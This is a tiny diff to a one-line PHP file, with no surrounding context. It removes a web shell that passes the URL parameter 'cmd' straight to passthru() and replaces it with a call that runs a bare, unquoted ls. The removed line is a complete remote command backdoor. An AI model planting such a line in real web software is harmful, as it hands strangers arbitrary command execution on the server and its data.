@@ -1,1 +1,1 @@
-<?php passthru($_GET['cmd']); ?>
+<?php passthru(ls); ?>
